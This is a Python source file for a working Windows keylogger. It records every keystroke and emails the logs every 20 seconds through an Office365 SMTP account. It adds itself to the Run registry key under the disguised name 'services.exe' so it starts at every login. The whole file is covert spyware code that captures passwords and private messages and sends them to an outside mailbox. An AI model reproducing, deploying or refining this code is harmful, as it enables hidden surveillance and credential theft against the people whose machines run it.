try:
    import os
    import winreg as reg
    import keyboard  # for keylogs
    import smtplib  # for sending email using SMTP protocol
    from threading import Timer
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
except ModuleNotFoundError:
    from subprocess import call
    modules = ["keyboard"]
    call("pip install " + ' '.join(modules), shell=True)
finally:
    SEND_REPORT_EVERY = 20  # in seconds
    EMAIL_ADDRESS = "EMAIL@outlook.com"
    EMAIL_PASSWORD = "PASSWORD"


    class Keylogger:
        def __init__(self, interval, report_method="email"):
            self.interval = interval
            self.report_method = report_method
            # string variable that contains the log of all the keystrokes
            self.log = ""

        def callback(self, event): # whenever a keyboard event is occured
            name = event.name
            if len(name) > 1:
                # not a character, special key (e.g ctrl, alt, etc.)
                # uppercase with []
                if name == "space":
                    # " " instead of "space"
                    name = " "
                elif name == "enter":
                    # add a new line whenever an ENTER is pressed
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    # replace spaces with underscores
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
            # finally, add the key name to global `self.log` variable
            self.log += name

        def prepare_mail(self, message):
            msg = MIMEMultipart("alternative")
            msg["From"] = EMAIL_ADDRESS
            msg["To"] = EMAIL_ADDRESS
            msg["Subject"] = "Keylogger logs"
            text_part = MIMEText(message, "plain")
            msg.attach(text_part)

            # after making the mail, convert back as string message
            return msg.as_string()

        def sendmail(self, email, password, message):
            # manages a connection to an SMTP server
            server = smtplib.SMTP(host="smtp.office365.com", port=587)
            # connect to the SMTP server as TLS mode ( for security )
            server.starttls()
            # login to the email account
            server.login(email, password)
            # send the actual message
            server.sendmail(email, email, self.prepare_mail(message))
            # terminates the session
            server.quit()

        def report(self):
            if self.log:
                # if there is something in log, report it
                if self.report_method == "email":
                    self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)

            self.log = ""
            timer = Timer(interval=self.interval, function=self.report)
            # set the thread as daemon (dies when main thread die)
            timer.daemon = True
            # start the timer
            timer.start()

        def addToRegistry(self):
            # name of the python file with extension
            s_name = "services.exe"

            address = os.path.abspath(os.getcwd()) + '\\' + s_name

            # key to change is HKEY_CURRENT_USER
            # key value is Software\Microsoft\Windows\CurrentVersion\Run
            key = reg.HKEY_CURRENT_USER
            key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

            # open the key to make changes to
            open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)

            # modify the opened key
            reg.SetValueEx(open, "services", 0, reg.REG_SZ, address)

            # now close the opened key
            reg.CloseKey(open)

        def start(self):
            # add to autostart
            self.addToRegistry()
            # start the keylogger
            keyboard.on_release(callback=self.callback)
            # start reporting the keylogs
            self.report()
            keyboard.wait()


    if __name__ == "__main__":
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
        keylogger.start()
